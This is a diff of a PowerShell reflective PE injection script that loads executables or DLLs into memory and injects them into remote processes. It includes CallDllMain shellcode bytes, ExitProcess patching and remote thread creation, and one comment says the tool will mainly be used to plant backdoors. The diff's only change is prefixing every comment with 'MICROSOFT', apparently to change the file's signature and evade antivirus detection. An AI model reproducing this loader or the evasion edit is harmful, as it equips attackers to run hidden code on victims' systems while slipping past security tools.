-		#Copy each section from the PE in to memory
+		#MICROSOFTCopy each section from the PE in to memory
 		Write-Verbose "Copy PE sections in to memory"
 		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
 		
 		
-		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
+		#MICROSOFTUpdate the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
 		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
 		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types
 
 		
-		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
+		#MICROSOFTThe PE we are in-memory loading has DLLs it needs, import those DLLs for it
 		Write-Verbose "Import DLL's needed by the PE we are loading"
 		if ($RemoteLoading -eq $true)
 		{
@@ -2249,7 +2249,7 @@ $RemoteScriptBlock = {
 		}
 		
 		
-		#Update the memory protection flags for all the memory just allocated
+		#MICROSOFTUpdate the memory protection flags for all the memory just allocated
 		if ($RemoteLoading -eq $false)
 		{
 			if ($NXCompatible -eq $true)
@@ -2268,7 +2268,7 @@ $RemoteScriptBlock = {
 		}
 		
 		
-		#If remote loading, copy the DLL in to remote process memory
+		#MICROSOFTIf remote loading, copy the DLL in to remote process memory
 		if ($RemoteLoading -eq $true)
 		{
 			[UInt32]$NumBytesWritten = 0
@@ -2280,7 +2280,7 @@ $RemoteScriptBlock = {
 		}
 		
 		
-		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
+		#MICROSOFTCall the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
 		if ($PEInfo.FileType -ieq "DLL")
 		{
 			if ($RemoteLoading -eq $false)
@@ -2298,14 +2298,14 @@ $RemoteScriptBlock = {
 			
 				if ($PEInfo.PE64Bit -eq $true)
 				{
-					#Shellcode: CallDllMain.asm
+					#MICROSOFTShellcode: CallDllMain.asm
 					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
 					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
 					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
 				}
 				else
 				{
-					#Shellcode: CallDllMain.asm
+					#MICROSOFTShellcode: CallDllMain.asm
 					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
 					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
 					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
@@ -2349,13 +2349,13 @@ $RemoteScriptBlock = {
 		}
 		elseif ($PEInfo.FileType -ieq "EXE")
 		{
-			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
+			#MICROSOFTOverwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
 			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
 			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
 			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
 
-			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
-			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
+			#MICROSOFTIf this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
+			#MICROSOFT	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
 			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."
 
@@ -2389,14 +2389,14 @@ $RemoteScriptBlock = {
 		$PEHandle
 		)
 		
-		#Get Win32 constants and functions
+		#MICROSOFTGet Win32 constants and functions
 		$Win32Constants = Get-Win32Constants
 		$Win32Functions = Get-Win32Functions
 		$Win32Types = Get-Win32Types
 		
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		
-		#Call FreeLibrary for all the imports of the DLL
+		#MICROSOFTCall FreeLibrary for all the imports of the DLL
 		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
 		{
 			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
@@ -2405,7 +2405,7 @@ $RemoteScriptBlock = {
 			{
 				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
 				
-				#If the structure is null, it signals that this is the end of the array
+				#MICROSOFTIf the structure is null, it signals that this is the end of the array
 				if ($ImportDescriptor.Characteristics -eq 0 `
 						-and $ImportDescriptor.FirstThunk -eq 0 `
 						-and $ImportDescriptor.ForwarderChain -eq 0 `
@@ -2434,7 +2434,7 @@ $RemoteScriptBlock = {
 			}
 		}
 		
-		#Call DllMain with process detach
+		#MICROSOFTCall DllMain with process detach
 		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
 		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
 		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
@@ -2459,7 +2459,7 @@ $RemoteScriptBlock = {
 		
 		$RemoteProcHandle = [IntPtr]::Zero
 	
-		#If a remote process to inject in to is specified, get a handle to it
+		#MICROSOFTIf a remote process to inject in to is specified, get a handle to it
 		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
 		{
 			Throw "Can't supply a ProcId and ProcName, choose one or the other"
@@ -2483,13 +2483,13 @@ $RemoteScriptBlock = {
 			}
 		}
 		
-		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
-		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
-#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
-#		{
-#			Write-Verbose "Getting SeDebugPrivilege"
-#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-#		}	
+		#MICROSOFTJust realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
+		#MICROSOFTIf the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
+#MICROSOFT		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
+#MICROSOFT		{
+#MICROSOFT			Write-Verbose "Getting SeDebugPrivilege"
+#MICROSOFT			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
+#MICROSOFT		}	
 		
 		if (($ProcId -ne $null) -and ($ProcId -ne 0))
 		{
@@ -2503,7 +2503,7 @@ $RemoteScriptBlock = {
 		}
 		
 
-		#Load the PE reflectively
+		#MICROSOFTLoad the PE reflectively
 		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
 
         try
@@ -2528,7 +2528,7 @@ $RemoteScriptBlock = {
             Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
         }
 
-        #Determine whether or not to use 32bit or 64bit bytes
+        #MICROSOFTDetermine whether or not to use 32bit or 64bit bytes
         if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
         {
             [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
@@ -2554,10 +2554,10 @@ $RemoteScriptBlock = {
 		}
 		
 		$PEHandle = $PELoadedInfo[0]
-		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
+		$RemotePEHandle = $PELoadedInfo[1] #MICROSOFTonly matters if you loaded in to a remote process
 		
 		
-		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
+		#MICROSOFTCheck if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
 		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
 		{
@@ -2583,11 +2583,11 @@ $RemoteScriptBlock = {
 				        Write-Output $Output
 				        $Win32Functions.LocalFree.Invoke($OutputPtr);
 				    }
-			#########################################
-			### END OF YOUR CODE
-			#########################################
+			#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+			#MICROSOFT#MICROSOFT#MICROSOFT END OF YOUR CODE
+			#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 		}
-		#For remote DLL injection, call a void function which takes no parameters
+		#MICROSOFTFor remote DLL injection, call a void function which takes no parameters
 		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
 		{
 			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
@@ -2599,18 +2599,18 @@ $RemoteScriptBlock = {
 			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
 			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
 			
-			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
+			#MICROSOFTCreate the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
 			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
 		}
 		
-		#Don't free a library if it is injected in a remote process
+		#MICROSOFTDon't free a library if it is injected in a remote process
 		if ($RemoteProcHandle -eq [IntPtr]::Zero)
 		{
 			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
 		}
 		else
 		{
-			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
+			#MICROSOFTJust delete the memory allocated in PowerShell to build the PE before injecting to remote process
 			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
 			if ($Success -eq $false)
 			{
@@ -2624,7 +2624,7 @@ $RemoteScriptBlock = {
 	Main
 }
 
-#Main function to either run the script locally or remotely
+#MICROSOFTMain function to either run the script locally or remotely
 Function Main
 {
 	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
